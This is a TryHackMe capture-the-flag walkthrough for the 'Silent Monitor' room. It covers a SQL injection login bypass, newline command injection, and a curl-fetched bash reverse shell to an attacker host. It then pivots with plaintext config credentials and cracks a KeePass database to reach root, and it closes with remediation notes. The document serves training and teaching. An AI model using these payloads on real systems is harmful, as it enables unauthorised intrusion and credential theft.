# Silent Monitor

Room: https://tryhackme.com/room/silent-monitor

Enumerate a running internal service, exploit a vulnerable web application, pivot through the system, and crack your way to root.

Green Lights, Dark Corners

CorpNet's internal network operations centre has been running quietly for years. Monitoring hosts, logging events, and keeping the infrastructure alive. Or so it seems. A tip from a disgruntled contractor suggests that someone on the NOC team has been cutting corners, leaving doors open, and hiding things in places no one thinks to look.

The portal is up. The services show green. The audit log looks clean.

But clean logs can be written by anyone.

Your job is to get in, move through the system, and find out what is really running behind the secret dashboard.

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/silent-monitor.md

---

## Enumeration

Start with a full port scan.

```bash
TARGET=10.66.151.88
nmap $TARGET -sV -p-
```

Result:

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
5050/tcp open  http    Werkzeug httpd 2.0.2 Python 3.10.12
```

Only two useful services were exposed:

- `22/tcp` SSH
- `5050/tcp` Werkzeug Python web application

The main attack surface was the web service.

---

## Web Application Discovery

Open the web app:

```bash
curl -i http://10.66.151.88:5050/
```

Directory discovery revealed an internal login area:

```bash
gobuster dir -u http://10.66.151.88:5050/ -w /usr/share/wordlists/dirb/common.txt -x py,txt,html,json
```

The `/internal` page showed a CorpNet NOC login portal. The HTML form submitted to `/internal` with the parameters `username` and `password`.

Relevant form:

```html
<form method="POST" action="/internal" autocomplete="off">
  <input type="text" id="username" name="username">
  <input type="password" id="password" name="password">
</form>
```

---

## SQL Injection in Login

Because the login form accepted `username` and `password`, sqlmap was used against the POST request.

```bash
sqlmap -u "http://10.66.151.88:5050/internal"   --data="username=admin&password=admin"   -p username   --dbms=SQLite   --technique=B   --level=5 --risk=3   --code=302   --ignore-redirects   --skip-waf   --dump-all   --batch
```

sqlmap identified a boolean-based SQL injection in the `username` parameter.

Payload style:

```text
username=-8379' OR 6054=6054-- -
```

The successful condition was a `302` redirect to:

```text
/internal/dashboard
```

The database contained a `users` table and an `audit_log` table.

Relevant dumped user:

```text
username: netops
role: operator
password: [REDACTED MD5 HASH]
```

The audit logs also contained suspicious health-check entries:

```text
HEALTH_CHECK 127.0.0.1
HEALTH_CHECK 127.0.0.10%awhoami
HEALTH_CHECK 127.0.0.1%0awhoami
```

This hinted that the next vulnerability was likely newline command injection in the health check feature.

---

## Getting an Authenticated Session

The SQL injection was used to bypass login and save a session cookie.

```bash
curl -i -c cookies.txt -X POST http://10.66.148.129:5050/internal   -d "username=-8379' OR 6054=6054-- -&password=admin"
```

Then the dashboard was accessed with the saved cookie:

```bash
curl -i -b cookies.txt http://10.66.148.129:5050/internal/dashboard
```

---

## Command Injection in Health Check

The authenticated dashboard exposed a health check endpoint:

```text
POST /internal/health
target=127.0.0.1
```

A normal request looked like:

```bash
curl 'http://10.66.148.129:5050/internal/health'   -X POST   -H 'Content-Type: application/x-www-form-urlencoded'   -H 'Cookie: session=[REDACTED]'   --data-raw 'target=127.0.0.1'
```

Testing newline injection with `%0a` confirmed command execution:

```bash
curl -s 'http://10.66.148.129:5050/internal/health'   -X POST   -H 'Content-Type: application/x-www-form-urlencoded'   -H 'Cookie: session=[REDACTED]'   --data-raw 'target=127.0.0.1%0aid'
```

Output confirmed execution as `www-data`:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Reverse Shell

A staged reverse shell was used because quoting direct payloads was unreliable.

On the AttackBox, create `shell.sh`:

```bash
echo 'bash -c "bash -i >& /dev/tcp/192.168.205.203/4444 0>&1"' > shell.sh
python3 -m http.server 8001
```

In another terminal, start a listener:

```bash
nc -lvnp 4444
```

From the web command injection, download and execute the script:

```bash
curl -s 'http://10.66.148.129:5050/internal/health'   -X POST   -H 'Content-Type: application/x-www-form-urlencoded'   -H 'Cookie: session=[REDACTED]'   --data-raw 'target=127.0.0.1%0acurl+http://10.66.96.126:8001/shell.sh+-o+/tmp/shell.sh%0abash+/tmp/shell.sh'
```

This returned a shell as `www-data`.

Upgrade the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Application Source Review

The web app was located in `/opt/netops`.

```bash
cd /opt/netops
ls
```

Files:

```text
app.py
netops.db
secret.config
templates
```

Reading `app.py` confirmed both vulnerabilities.

The login query was vulnerable because it used direct string interpolation:

```python
query = (
    "SELECT id, username, role FROM users "
    "WHERE username = '%s' AND password = '%s'"
) % (username, pw_hash)
```

The health check was vulnerable because it used `shell=True` and concatenated user input:

```python
proc = subprocess.Popen(
    "ping -c 2 -W 1 " + target,
    shell=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True
)
```

The source even included a comment confirming the intended bug:

```python
# vulnerable to newline injection (\n / %0a), fix soon.
```

---

## Pivot to sysadmin

The `secret.config` file contained a backup-agent credential.

```bash
cat /opt/netops/secret.config
```

Relevant section:

```text
[backup_agent]
run_as   = sysadmin
password = [REDACTED]
```

The password did not work with `su`, but it did work over SSH.

```bash
ssh sysadmin@10.66.148.129
```

After logging in as `sysadmin`, the user flag was found:

```bash
cat ~/user.txt
```

User flag:

```text
THM{REDACTED}
```

---

## KeePass Database Discovery

Inside the `sysadmin` home directory, a backup folder contained a KeePass database.

```bash
cd ~/backups
ls
cat README.txt
```

Files:

```text
README.txt
infrastructure.kdbx
```

The README explained that this was a credential-store backup:

```text
Backup archive — infrastructure credentials

Periodic exports from the credential store are placed here by the backup agent.
Treat all files in this directory as CONFIDENTIAL.

infrastructure.kdbx — KeePass credential database
```

The KDBX file was copied back to the AttackBox.

```bash
scp sysadmin@10.66.148.129:/home/sysadmin/backups/infrastructure.kdbx .
```

---

## Cracking the KeePass Database

The initial `keepass2john` tool on the AttackBox was too old and did not support KDBX 4.

A newer `keepass2john.py` was used to convert the database to a John hash.

```bash
python3 keepass2john.py infrastructure.kdbx > keepass.hash
```

The older packaged `john` and `hashcat` versions had trouble loading the KDBX 4 hash, so a newer John Jumbo build was used on a local VM.

```bash
git clone https://github.com/openwall/john.git john-jumbo
cd john-jumbo/src
./configure
make -s clean
make -sj$(nproc)
```

Then crack the hash:

```bash
../run/john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
../run/john --show keepass.hash
```

Recovered KeePass password:

```text
[REDACTED]
```

In this run, the database password cracked as a simple seasonal word.

---

## Extracting the Root Password

Open the KeePass database:

```bash
keepassxc-cli show infrastructure.kdbx "Root User Password - Sensitive"
```

Enter the cracked KeePass password when prompted.

Recovered entry:

```text
Title: Root User Password - Sensitive
UserName: root
Password: [REDACTED]
URL: https://keepass.info/
Notes: root user password, remember to change later.
```

---

## Root Access

From the `sysadmin` SSH session:

```bash
su root
```

Enter the root password from KeePass.

Then read the root flag:

```bash
cd /root
ls
cat root.txt
```

Root flag:

```text
THM{REDACTED}
```

---

## Vulnerability Chain

1. Exposed Flask/Werkzeug application on port 5050
2. SQL injection in `/internal` login form
3. Authenticated access to internal dashboard
4. Newline command injection in `/internal/health`
5. Reverse shell as `www-data`
6. Sensitive backup-agent credential in `/opt/netops/secret.config`
7. SSH access as `sysadmin`
8. KeePass database backup in `~/backups`
9. Cracked KDBX password
10. Root password recovered from KeePass
11. Root access and root flag

---

## Remediation Notes

- Use parameterised SQL queries for authentication.
- Do not store credentials in plaintext config files.
- Do not use `shell=True` with user-controlled input.
- Validate health-check targets strictly as IP addresses or approved hostnames.
- Store application secrets in a proper secrets manager.
- Protect credential-store backups and avoid placing root passwords in shared backups.
- Use strong master passwords for KeePass databases.
- Avoid reusing service-account credentials for interactive login.
